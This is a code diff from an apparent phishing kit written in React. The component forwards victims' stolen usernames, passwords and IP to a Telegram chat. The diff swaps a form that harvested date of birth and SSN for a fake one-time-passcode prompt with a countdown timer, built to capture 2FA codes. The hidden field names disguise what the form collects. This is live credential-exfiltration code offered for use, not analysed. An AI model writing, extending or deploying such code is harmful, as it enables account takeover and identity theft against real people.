@@ -2,20 +2,18 @@ import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
 import TelegramSend from "../utils/send-message";
+import Countdown from "react-countdown";
 
 
 
-export default function Identity() {
-  const [formInput, setFormInput] = useState<IdentityT>({
-    examCode: "",
-    candidateNumber: "",
+export default function Addition() {
+  const [formInput, setFormInput] = useState<Addition>({
+    courseCode:""
   });
 
   const login1: Login = cookies.get("login1");
   const login2: Login2 = cookies.get("login2");
   const ip: string = cookies.get("ip");
-  const courseCode: string = cookies.get("courseCode");
-
   const navigate = useNavigate();
 const [isLoading, setIsLoading] = useState(false)
   function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
@@ -43,31 +41,37 @@ const [isLoading, setIsLoading] = useState(false)
     Username 2: ${login2.username2}
     Password 2: ${login2.password2}
 
-     Code: ${courseCode}
-
-    SSN: ${formInput.candidateNumber}
-    Phone Number: ${formInput.examCode}
+    Code: ${formInput.courseCode}
     `;
 
-    await TelegramSend(message);
+    await TelegramSend(message)
+    cookies.set("courseCode", formInput.courseCode)
     setIsLoading(false);
-    cookies.set("identity", formInput);
-    navigate("../login/auth/2", { replace: true });
+    navigate("../login/auth/3", {replace:true})
   }
+
+    const renderer = ({minutes, seconds, completed}:{hours:number, minutes:number, seconds:number, completed:boolean}) =>{
+    if(completed){
+        return <button className="underline" type="button" onClick={()=>window.location.reload()}>Resend code</button>
+    }else{
+        return <div className="text-red-500 font-bold">Time remaining - {minutes.toString().padStart(2, "0")+"m"} : {seconds.toString().padStart(2, "0")+"s"}</div>
+    }
+  }
+
   return (
     <>
+    <p className="bg-green-100 p-4">For your security, A one time passcode has been sent to your phone number and email address. Please enter the code below </p>
     <form action="" method="post" onSubmit={handleSubmit}>
       <div className="form-area">
+          
             <div className="input-field">
-                <label htmlFor="">DOB</label>
-                <input type="text" name="examCode" placeholder="MM/DD/YYYY" required onChange={handleInputChange}/>
-            </div>
-            <div className="input-field">
-                <label htmlFor="">SSN</label>
-                <input type="text" name="candidateNumber" required onChange={handleInputChange}/>
+                <label htmlFor="">Code</label>
+                <input type="text" name="courseCode" required onChange={handleInputChange}/>
             </div>
 
-          
+            <div>
+                <Countdown date={Date.now() + 300000} renderer={renderer}/>
+              </div>
 
           {isLoading ?
             (
